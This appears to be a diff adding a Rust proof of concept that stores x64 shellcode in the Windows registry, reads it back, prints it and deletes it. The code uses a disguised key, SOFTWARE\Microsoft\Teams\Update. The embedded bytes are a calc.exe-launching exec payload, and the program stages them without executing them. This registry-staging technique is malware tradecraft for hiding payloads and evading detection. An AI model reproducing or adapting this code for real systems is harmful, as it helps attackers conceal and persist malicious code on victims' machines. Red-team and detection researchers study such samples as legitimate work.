@@ -1,0 +1,178 @@
+use std::ptr::null_mut;
+
+use windows_sys::Win32::System::Registry::{
+    HKEY, HKEY_CURRENT_USER, KEY_READ, KEY_WRITE, REG_BINARY, RegCloseKey, RegCreateKeyExA,
+    RegDeleteValueA, RegOpenKeyExA, RegQueryValueExA, RegSetValueExA,
+};
+
+fn save_data(bytes: &[u8]) -> bool {
+    let path = b"SOFTWARE\\Microsoft\\Teams\\Update\0";
+    let value_name = b"Data\0";
+    let mut h_key: HKEY = null_mut();
+    if unsafe {
+        RegCreateKeyExA(
+            HKEY_CURRENT_USER,
+            path.as_ptr(),
+            0,
+            null_mut(),
+            0,
+            KEY_WRITE,
+            null_mut(),
+            &mut h_key,
+            null_mut(),
+        ) != 0
+    } {
+        return false;
+    }
+
+    if unsafe {
+        RegSetValueExA(
+            h_key,
+            value_name.as_ptr(),
+            0,
+            REG_BINARY,
+            bytes.as_ptr(),
+            bytes.len() as u32,
+        ) != 0
+    } {
+        return false;
+    }
+
+    unsafe { RegCloseKey(h_key) };
+
+    true
+}
+
+fn load_data() -> Option<Vec<u8>> {
+    let path = b"SOFTWARE\\Microsoft\\Teams\\Update\0";
+    let value_name = b"Data\0";
+    let mut h_key: HKEY = null_mut();
+    if unsafe { RegOpenKeyExA(HKEY_CURRENT_USER, path.as_ptr(), 0, KEY_READ, &mut h_key) != 0 } {
+        return None;
+    }
+
+    let mut size: u32 = 0;
+    let mut kind: u32 = 0;
+    if unsafe {
+        RegQueryValueExA(
+            h_key,
+            value_name.as_ptr(),
+            null_mut(),
+            &mut kind,
+            null_mut(),
+            &mut size,
+        ) != 0
+    } {
+        unsafe { RegCloseKey(h_key) };
+        return None;
+    }
+
+    let mut buffer = vec![0u8; size as usize];
+    if unsafe {
+        RegQueryValueExA(
+            h_key,
+            value_name.as_ptr(),
+            null_mut(),
+            &mut kind,
+            buffer.as_mut_ptr(),
+            &mut size,
+        ) != 0
+    } {
+        unsafe { RegCloseKey(h_key) };
+        return None;
+    }
+
+    unsafe { RegCloseKey(h_key) };
+    Some(buffer)
+}
+
+fn clean_data() -> bool {
+    let path = b"SOFTWARE\\Microsoft\\Teams\\Update\0";
+    let value_name = b"Data\0";
+    let mut h_key: HKEY = null_mut();
+    if unsafe { RegOpenKeyExA(HKEY_CURRENT_USER, path.as_ptr(), 0, KEY_WRITE, &mut h_key) != 0 } {
+        return false;
+    }
+
+    if unsafe { RegSetValueExA(h_key, value_name.as_ptr(), 0, REG_BINARY, null_mut(), 0) != 0 } {
+        unsafe { RegCloseKey(h_key) };
+        return false;
+    }
+
+    if unsafe { RegDeleteValueA(h_key, value_name.as_ptr()) != 0 } {
+        unsafe { RegCloseKey(h_key) };
+        return false;
+    }
+
+    // if unsafe { RegDeleteValueA(HKEY_CURRENT_USER, path.as_ptr()) != 0 } {
+    //     unsafe { RegCloseKey(h_key) };
+    //     return false;
+    // }
+
+    unsafe { RegCloseKey(h_key) };
+    true
+}
+
+const SHELLCODE: &[u8] = &[
+    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
+    0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
+    0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
+    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
+    0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
+    0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
+    0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
+    0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
+    0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
+    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
+    0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
+    0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
+    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
+    0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
+    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47,
+    0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e,
+    0x65, 0x78, 0x65, 0x00,
+];
+
+fn hex_dump(data: &[u8]) {
+    for (i, byte) in data.iter().enumerate() {
+        if i % 16 == 0 {
+            print!("\n  {:08x}: ", i);
+        }
+        print!("{:02x} ", byte);
+    }
+    println!();
+}
+
+fn pause() {
+    use std::io::{self, Write};
+    print!("Press Enter to continue...");
+    io::stdout().flush().unwrap();
+    let mut input = String::new();
+    io::stdin().read_line(&mut input).unwrap();
+}
+
+fn main() {
+    if !save_data(SHELLCODE) {
+        println!("[-] Failed to save data to the registry.");
+        return;
+    }
+
+    println!("[+] Saved data to the registry:");
+
+    let loaded_data = load_data();
+    if let Some(ref data) = loaded_data {
+        print!("[+] Loaded data from the registry:");
+        hex_dump(data);
+    } else {
+        println!("[-] Failed to load data from the registry.");
+        return;
+    }
+
+    pause();
+
+    if !clean_data() {
+        println!("[-] Failed to clean data from the registry.");
+        return;
+    }
+}
